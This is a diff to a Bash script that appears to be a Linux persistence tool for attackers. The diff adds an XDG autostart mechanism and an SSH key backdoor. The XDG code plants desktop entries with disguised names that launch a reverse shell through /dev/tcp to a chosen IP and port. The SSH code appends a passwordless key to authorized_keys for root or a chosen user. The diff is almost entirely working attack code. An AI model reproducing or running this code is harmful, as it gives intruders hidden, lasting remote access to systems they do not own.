@@ -41,6 +41,7 @@ usage_user() {
     echo "        --ip <ip>                  Specify IP address"
     echo "        --port <port>              Specify port number"
     echo "  --ssh-key                   SSH key persistence"
+    echo "      --default                    Use default SSH key settings"
     echo "  --systemd                   Systemd service persistence"
     echo "      --default                    Use default systemd settings"
     echo "          --ip <ip>                  Specify IP address"
@@ -63,6 +64,13 @@ usage_user() {
     echo "          --port <port>              Specify port number"
     echo "      --custom                     Use custom profile settings"
     echo "          --file <file>                Specify custom profile file"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "  --xdg                        XDG autostart persistence"
+    echo "      --default                    Use default XDG settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom XDG settings"
+    echo "          --file <file>                Specify custom desktop entry file"
     echo "          --command <command>          Specify custom persistence command"
 }
 
@@ -84,6 +92,9 @@ usage_root() {
     echo "          --name <name>               Specify custom cron job name"
     echo "          --crontab                   Persist in crontab file"
     echo "  --ssh-key                   SSH key persistence"
+    echo "      --default                    Use default SSH key settings"
+    echo "      --custom                     Use custom SSH key settings"
+    echo "          --user <user>               Specify user for custom SSH key"
     echo "  --systemd                   Systemd service persistence"
     echo "      --default                    Use default systemd settings"
     echo "          --ip <ip>                  Specify IP address"
@@ -106,6 +117,13 @@ usage_root() {
     echo "          --port <port>              Specify port number"
     echo "      --custom                     Use custom profile settings"
     echo "          --file <file>                Specify custom profile file"
+    echo "          --command <command>          Specify custom persistence command"
+    echo "  --xdg                        XDG autostart persistence"
+    echo "      --default                    Use default XDG settings"
+    echo "          --ip <ip>                  Specify IP address"
+    echo "          --port <port>              Specify port number"
+    echo "      --custom                     Use custom XDG settings"
+    echo "          --file <file>                Specify custom desktop entry file"
     echo "          --command <command>          Specify custom persistence command"
 }
 
@@ -442,7 +460,7 @@ setup_at() {
     local time=""
 
     if ! command -v at &> /dev/null; then
-        echo "Error: 'at' binary is not present. Please install 'at' to use this feature."
+        echo "Error: 'at' binary is not present. Please install 'at' to use this mechanism."
         exit 1
     fi
 
@@ -573,14 +591,183 @@ setup_shell_profile() {
 }
 
 setup_xdg() {
-    echo "Generating XDG persistence..."
-    # Add your XDG persistence code here  
+    if [[ ! -d "/etc/xdg" ]]; then
+        echo "Warning: /etc/xdg directory does not exist. XDG might not be present on this system."
+    fi
+
+    local profile_path=""
+    local command=""
+    local custom=0
+    local default=0
+    local ip=""
+    local port=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --file )
+                shift
+                profile_path=$1
+                ;;
+            --command )
+                shift
+                command=$1
+                ;;
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            * )
+                echo "Invalid option for --xdg: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    elif [[ $default -eq 1 ]]; then
+        if [[ -z $ip || -z $port ]]; then
+            echo "Error: --ip and --port must be specified when using --default."
+            exit 1
+        fi
+
+        if check_root; then
+            profile_path="/etc/xdg/autostart/pkc12-register.desktop"
+            command="/etc/xdg/pkc12-register"
+            mkdir -p /etc/xdg/autostart
+            echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=pkc12-register" > $profile_path
+            echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
+            chmod +x $command
+        else
+            local current_user=$(whoami)
+            profile_path="/home/$current_user/.config/autostart/user-dirs.desktop"
+            command="/home/$current_user/.config/autostart/.user-dirs"
+            mkdir -p /home/$current_user/.config/autostart
+            echo -e "[Desktop Entry]\nType=Application\nExec=$command\nName=user-dirs" > $profile_path
+            echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $command
+            chmod +x $command
+        fi
+
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $profile_path || -z $command ]]; then
+            echo "Error: --file and --command must be specified when using --custom."
+            exit 1
+        fi
+
+        if check_root; then
+            local exec_path=${profile_path%.desktop}
+            echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
+            echo -e "#!/bin/bash\n$command" > $exec_path
+            chmod +x $exec_path
+        else
+            local current_user=$(whoami)
+            profile_path="/home/$current_user/.config/autostart/$(basename $profile_path)"
+            local exec_path="/home/$current_user/.config/autostart/$(basename ${profile_path%.desktop})"
+            mkdir -p /home/$current_user/.config/autostart
+            echo -e "[Desktop Entry]\nType=Application\nExec=$exec_path\nName=$(basename $exec_path)" > $profile_path
+            echo -e "#!/bin/bash\n$command" > $exec_path
+            chmod +x $exec_path
+        fi
+    else
+        echo "Error: Either --default or --custom must be specified for --xdg."
+        exit 1
+    fi
+
+    echo "[+] XDG persistence established."
 }
 
 # Function for generating SSH key
 setup_ssh_key() {
-    echo "Generating SSH key..."
-    # Add your SSH key generation code here
+    if ! command -v ssh-keygen &> /dev/null; then
+        echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
+        exit 1
+    fi
+
+    local default=0
+    local custom=0
+    local target_user=""
+    local ssh_dir=""
+    local ssh_key_path=""
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --default )
+                default=1
+                ;;
+            --custom )
+                custom=1
+                ;;
+            --user )
+                shift
+                target_user=$1
+                ;;
+            * )
+                echo "Invalid option for --ssh-key: $1"
+                exit 1
+        esac
+        shift
+    done
+
+    if [[ $default -eq 1 && $custom -eq 1 ]]; then
+        echo "Error: --default and --custom cannot be specified together."
+        exit 1
+    elif [[ $default -eq 1 ]]; then
+        if check_root; then
+            ssh_dir="/root/.ssh"
+            ssh_key_path="$ssh_dir/id_rsa1822"
+        else
+            local current_user=$(whoami)
+            ssh_dir="/home/$current_user/.ssh"
+            ssh_key_path="$ssh_dir/id_rsa1822"
+        fi
+
+        mkdir -p $ssh_dir
+        ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
+        cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
+        echo "SSH key generated:"
+        echo "Private key: $ssh_key_path"
+        echo "Public key: ${ssh_key_path}.pub"
+
+    elif [[ $custom -eq 1 ]]; then
+        if [[ -z $target_user ]]; then
+            echo "Error: --user must be specified when using --custom."
+            exit 1
+        fi
+
+        if id -u $target_user &>/dev/null; then
+            local user_home=$(eval echo ~$target_user)
+            ssh_dir="$user_home/.ssh"
+            ssh_key_path="$ssh_dir/id_rsa1822"
+
+            mkdir -p $ssh_dir
+            chown $target_user:$target_user $ssh_dir
+            sudo -u $target_user ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
+            cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
+            chown $target_user:$target_user $ssh_key_path $ssh_key_path.pub $ssh_dir/authorized_keys
+            echo "SSH key generated for $target_user:"
+            echo "Private key: $ssh_key_path"
+            echo "Public key: ${ssh_key_path}.pub"
+        else
+            echo "Error: User $target_user does not exist."
+            exit 1
+        fi
+    else
+        echo "Error: Either --default or --custom must be specified for --ssh-key."
+        exit 1
+    fi
+
+    echo "[+] SSH key persistence established."
 }
 
 # Main function
@@ -643,12 +830,18 @@ main() {
                 exit
                 ;;
             --ssh-key )
-                setup_ssh_key
+                shift
+                setup_ssh_key "$@"
                 exit
                 ;;
             --shell-configuration )
                 shift
                 setup_shell_profile "$@"
+                exit
+                ;;
+            --xdg )
+                shift
+                setup_xdg "$@"
                 exit
                 ;;
             * )
